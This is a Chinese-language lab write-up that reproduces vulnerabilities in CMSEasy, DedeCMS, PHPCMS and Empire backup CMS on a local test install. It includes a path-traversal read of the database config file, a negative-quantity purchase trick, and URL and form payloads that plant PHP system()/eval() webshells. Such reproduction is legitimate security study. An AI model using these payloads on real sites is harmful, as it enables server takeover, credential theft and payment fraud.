## 一、cmseasy7.3.8--文件读取漏洞复现步骤

###  **1.首先准备一套源码:**

### 2.在mysql钟创建cmseasy7 数据库

其他选项菜单》》Mysql工具》》快速创建数据库

![1614958406_60424f465791e38e85d92.png!small](https://image.3001.net/images/20210305/1614958406_60424f465791e38e85d92.png!small)

创建数据库成功![1614958418_60424f525e60f945541ae.png!small](https://image.3001.net/images/20210305/1614958418_60424f525e60f945541ae.png!small)

### 3.再将准备好的源码，解压放到网站根目录：

安装：

![1614958430_60424f5e5954b3e689eb7.png!small](https://image.3001.net/images/20210305/1614958430_60424f5e5954b3e689eb7.png!small)

我的管理员密码：

chaosec

![1614958443_60424f6b77216b81a23aa.png!small](https://image.3001.net/images/20210305/1614958443_60424f6b77216b81a23aa.png!small)

### 4.登录后台进行漏洞复现

后台地址

 _http://127.0.0.1/cmseasy7/index.php?admin_dir=admin
&site=default#index_connent_

这个可以记住，对我们以后渗透有帮助

![1614958454_60424f76df06b09fe4b75.png!small](https://image.3001.net/images/20210305/1614958454_60424f76df06b09fe4b75.png!small)

发现成功登入

![1614958466_60424f82d8d54b9594206.png!small](https://image.3001.net/images/20210305/1614958466_60424f82d8d54b9594206.png!small)

### 6.进行漏洞复现

A.进到管理界面 ——> 模板 ——> 编辑模板

![1614958476_60424f8c5c85ac5a0ab3e.png!small](https://image.3001.net/images/20210305/1614958476_60424f8c5c85ac5a0ab3e.png!small)

B.观察模板编辑功能，存在对模板的html文件的读取（查看）操作，对应到HTTP请求可以明显看到可控参数。

![1614958487_60424f9742db30bdba1a4.png!small](https://image.3001.net/images/20210305/1614958487_60424f9742db30bdba1a4.png!small)

C.开启bp抓包，进行读取文件

![1614958497_60424fa12cc0342f475d3.png!small](https://image.3001.net/images/20210305/1614958497_60424fa12cc0342f475d3.png!small)

D.发送到reperter模块下

![1614958509_60424fad1d40d5faa1c32.png!small](https://image.3001.net/images/20210305/1614958509_60424fad1d40d5faa1c32.png!small)

之后再进行验证这个读取漏洞

![1614958518_60424fb6f14aedcb7a3b2.png!small](https://image.3001.net/images/20210305/1614958518_60424fb6f14aedcb7a3b2.png!small)

在读取db文件：

../../config/config_database.php

![1614958546_60424fd2739ffb3a1b32d.png!small](https://image.3001.net/images/20210305/1614958546_60424fd2739ffb3a1b32d.png!small)

## 二、cmseasy7.6.3.2--逻辑漏洞复现

1.准备源码

2.同738的创建一个数据库

3.进行安装cms

安装步骤也和上一个一模一样

![1614958597_60425005cf67d3cd1e85c.png!small](https://image.3001.net/images/20210305/1614958597_60425005cf67d3cd1e85c.png!small)

4.漏洞复现

![1614958610_60425012f038f4809ad6e.png!small](https://image.3001.net/images/20210305/1614958610_60425012f038f4809ad6e.png!small)

发现原本就有100元余额

我们可以通过phpmyadmin登录数据库后台来修改金额

其实这也不算一个逻辑漏洞，相当于一个弱口令或者其他漏洞，接下来复现的才是一个弱口令

![1614958624_60425020e317576f2e0f1.png!small](https://image.3001.net/images/20210305/1614958624_60425020e317576f2e0f1.png!small)

将刚才创建的数据库cmseasy76里面的用户表cmseasy_user里面的积分字段改成123，我们回来再进行观察金额

![1614958634_6042502a35798cbc19fdb.png!small](https://image.3001.net/images/20210305/1614958634_6042502a35798cbc19fdb.png!small)

我们购买一个商品，进行逻辑漏洞复现

![1614958643_604250338493df0f1ccfb.png!small](https://image.3001.net/images/20210305/1614958643_604250338493df0f1ccfb.png!small)

点击购买，然后进行抓包

![1614958652_6042503c74a0dd32d489d.png!small](https://image.3001.net/images/20210305/1614958652_6042503c74a0dd32d489d.png!small)

将数量改成负数，之后放包

在进行防包

![1614958661_60425045dee6d69d17e49.png!small](https://image.3001.net/images/20210305/1614958661_60425045dee6d69d17e49.png!small)

发现价格变成了负数

![1614958671_6042504f77ffeb845b6f4.png!small](https://image.3001.net/images/20210305/1614958671_6042504f77ffeb845b6f4.png!small)

这时候我们就可以将bp的代理给关闭了

![1614958681_60425059bff5866da91a4.png!small](https://image.3001.net/images/20210305/1614958681_60425059bff5866da91a4.png!small)

发现购买成功

![1614958690_604250626521b1ec9a636.png!small](https://image.3001.net/images/20210305/1614958690_604250626521b1ec9a636.png!small)

可以发现金额变多了

![1614958700_6042506cf0b63ce5a507b.png!small](https://image.3001.net/images/20210305/1614958700_6042506cf0b63ce5a507b.png!small)

漏洞复现完成

## 三、dedecms5.7--获取webshell漏洞复现

1.准备dedecms的源码

2.创建数据库

3.安装

![1614958776_604250b804e8d7d4b8b4e.png!small](https://image.3001.net/images/20210305/1614958776_604250b804e8d7d4b8b4e.png!small)

![1614958782_604250be822164eebd521.png!small](https://image.3001.net/images/20210305/1614958782_604250be822164eebd521.png!small)

![1614958788_604250c49f265e92c16eb.png!small](https://image.3001.net/images/20210305/1614958788_604250c49f265e92c16eb.png!small)

![1614958794_604250ca0474e6b09b7ac.png!small](https://image.3001.net/images/20210305/1614958794_604250ca0474e6b09b7ac.png!small)

安装完成之后，登录后台：

![1614958803_604250d3536dcfe4a0094.png!small](https://image.3001.net/images/20210305/1614958803_604250d3536dcfe4a0094.png!small)

登录成功

![1614958811_604250dba2b86b8a217de.png!small](https://image.3001.net/images/20210305/1614958811_604250dba2b86b8a217de.png!small)

登录成功之后，在进行漏洞复现

4.漏洞复现

1.首先访问：

进到网站后台 ——> 访问`dede/tpl.php?action=upload`获取token值

[
_http://127.0.0.1:8086/cms2021/dede/dede/tpl.php?action=upload_](http://127.0.0.1:8086/cms2021/dede/dede/tpl.php?action=upload)

![1614958822_604250e62ce54cd4eb6e6.png!small](https://image.3001.net/images/20210305/1614958822_604250e62ce54cd4eb6e6.png!small)

144f7de9a7d73c64f4f54fdfb25ea4f4

2.填写相应 Payload 即可在`/include/taglib/（文件名）.lib.php`生成webshell。

构造payload：

http://127.0.0.1:8086/cms2021/dede/dede/tpl.php?filename=chaosec.lib.php&action=savetagfile&content=<%3fphp+@system($_GET[chaosec])%3b%3f>&token=144f7de9a7d73c64f4f54fdfb25ea4f4

创建shell成功

![1614958837_604250f5af93a5f527d08.png!small](https://image.3001.net/images/20210305/1614958837_604250f5af93a5f527d08.png!small)

![1614958842_604250fa969548fbee63f.png!small](https://image.3001.net/images/20210305/1614958842_604250fa969548fbee63f.png!small)

验证：

[
_http://127.0.0.1:8086/cms2021/dede/include/taglib/chaosec.lib.php?chaosec=_](http://127.0.0.1:8086/cms2021/dede/include/taglib/webshell.lib.php?cmd=whoami)ipconfig

![1614958854_6042510668326e74a7c6d.png!small](https://image.3001.net/images/20210305/1614958854_6042510668326e74a7c6d.png!small)

要重新构造一句话木马

http://127.0.0.1:8086/cms2021/dede/dede/tpl.php?filename=chaosec123.lib.php&action=savetagfile&content=<%3fphp+@eval($_POST[chaosec])%3b%3f>&token=144f7de9a7d73c64f4f54fdfb25ea4f4

![1614958868_6042511477d0d06ce4e69.png!small](https://image.3001.net/images/20210305/1614958868_6042511477d0d06ce4e69.png!small)

![1614958882_6042512230605fc98d5ed.png!small](https://image.3001.net/images/20210305/1614958882_6042512230605fc98d5ed.png!small)

验证：

蚁剑测试成功

## 四、phpcms v9.6.3--getshell漏洞复现

1.准备源码

2.创建数据库

3.cms安装

![1614958925_6042514de4f97f3f82260.png!small](https://image.3001.net/images/20210305/1614958925_6042514de4f97f3f82260.png!small)

点击下一步

![1614958943_6042515fe8555c2d3213e.png!small](https://image.3001.net/images/20210305/1614958943_6042515fe8555c2d3213e.png!small)

选择第一个

![1614958953_6042516910df445648c22.png!small](https://image.3001.net/images/20210305/1614958953_6042516910df445648c22.png!small)

这一步告诉我们了目录文件以及权限

![1614958961_60425171ecdaa3e22af97.png!small](https://image.3001.net/images/20210305/1614958961_60425171ecdaa3e22af97.png!small)

这一步要选择数据库密码，

phpcms管理员密码设置成123456即可

![1614958970_6042517a6bd43656b6162.png!small](https://image.3001.net/images/20210305/1614958970_6042517a6bd43656b6162.png!small)

静静等待就好

![1614958979_6042518319447e3c63b46.png!small](https://image.3001.net/images/20210305/1614958979_6042518319447e3c63b46.png!small)

![1614958990_6042518ebb8cd5d188803.png!small](https://image.3001.net/images/20210305/1614958990_6042518ebb8cd5d188803.png!small)

4.漏洞复现

首先要登录后台

![1614959000_60425198300d766e626fc.png!small](https://image.3001.net/images/20210305/1614959000_60425198300d766e626fc.png!small)

phpcms的默认用户名是phpcms，这个到以后渗透遇到相同cms可能会用的到

1.后台 - 设置 - connect

![1614959010_604251a2bc4df5b3d6988.png!small](https://image.3001.net/images/20210305/1614959010_604251a2bc4df5b3d6988.png!small)

\',@@eval($_POST[chaosec]),//,

![1614959025_604251b175cf71a7ff36b.png!small](https://image.3001.net/images/20210305/1614959025_604251b175cf71a7ff36b.png!small)

2.闭合前面及后面的代码。

3.之后找到那个文件，查看写入情况

![1614959036_604251bc4fc3a7a117e2b.png!small](https://image.3001.net/images/20210305/1614959036_604251bc4fc3a7a117e2b.png!small)

在58行发现写入成功

![1614959045_604251c56696abcb24cae.png!small](https://image.3001.net/images/20210305/1614959045_604251c56696abcb24cae.png!small)

4.验证

![1614959054_604251ce68eb4ce9cc7c9.png!small](https://image.3001.net/images/20210305/1614959054_604251ce68eb4ce9cc7c9.png!small)

蚁剑进行验证

![1614959064_604251d847f3eed55d220.png!small](https://image.3001.net/images/20210305/1614959064_604251d847f3eed55d220.png!small)

## 五、帝国备份王cms5.1--getshell漏洞复现

1.准备源码

2.安装数据库

3.安装cms

安装之前要将php.ini的short_open_tage=on

![1614959104_6042520017a3bd39dd345.png!small](https://image.3001.net/images/20210305/1614959104_6042520017a3bd39dd345.png!small)

进入后台

![1614959115_6042520bcd072ef55202e.png!small](https://image.3001.net/images/20210305/1614959115_6042520bcd072ef55202e.png!small)

falao说这个登录信息要自己信息收集再进去，我反手一百度

![1614959125_604252155c6e0d9fed612.png!small](https://image.3001.net/images/20210305/1614959125_604252155c6e0d9fed612.png!small)

运气~~~~

![1614959133_6042521dbdb01e654109c.png!small](https://image.3001.net/images/20210305/1614959133_6042521dbdb01e654109c.png!small)

然后设置数据库

![1614959142_60425226a29973073c352.png!small](https://image.3001.net/images/20210305/1614959142_60425226a29973073c352.png!small)

管理员设置

![1614959152_604252301aad3999049bf.png!small](https://image.3001.net/images/20210305/1614959152_604252301aad3999049bf.png!small)

4.漏洞复现

1.到备份功能随便找一个数据库备份一下数据

![1614959163_6042523b3a16c84afe3ad.png!small](https://image.3001.net/images/20210305/1614959163_6042523b3a16c84afe3ad.png!small)

备份目录：/bdata/cmseasy76_20210304164442MGdh6i

![1614959173_6042524594e5717e3a483.png!small](https://image.3001.net/images/20210305/1614959173_6042524594e5717e3a483.png!small)

![1614959177_6042524992ecba6877bfa.png!small](https://image.3001.net/images/20210305/1614959177_6042524992ecba6877bfa.png!small)

2.然后到 管理备份目录 选择刚才备份的数据库 点击 替换目录文件内容

![1614959188_6042525466793c1fca826.png!small](https://image.3001.net/images/20210305/1614959188_6042525466793c1fca826.png!small)

3.将"$b_table=" 替换成 "phpinfo(); $b_table="

![1614959204_60425264c0a2971983399.png!small](https://image.3001.net/images/20210305/1614959204_60425264c0a2971983399.png!small)

发现成功写入，写入紧接着被杀了

![1614959215_6042526f6486cd5e9142e.png!small](https://image.3001.net/images/20210305/1614959215_6042526f6486cd5e9142e.png!small)

给他恢复

![1614959225_60425279b80e86355b1ac.png!small](https://image.3001.net/images/20210305/1614959225_60425279b80e86355b1ac.png!small)

验证:'

[
_http://127.0.0.1:8086/cms2021/dgcms/bdata/cmseasy76_20210304164442MGdh6i/config.php_](http://127.0.0.1:8086/cms2021/dgcms/bdata/cmseasy76_20210304164442MGdh6i/config.php)

![1614959234_60425282c5ccae68e6300.png!small](https://image.3001.net/images/20210305/1614959234_60425282c5ccae68e6300.png!small)

![1614959239_604252875a4a3207d8084.png!small](https://image.3001.net/images/20210305/1614959239_604252875a4a3207d8084.png!small)

  

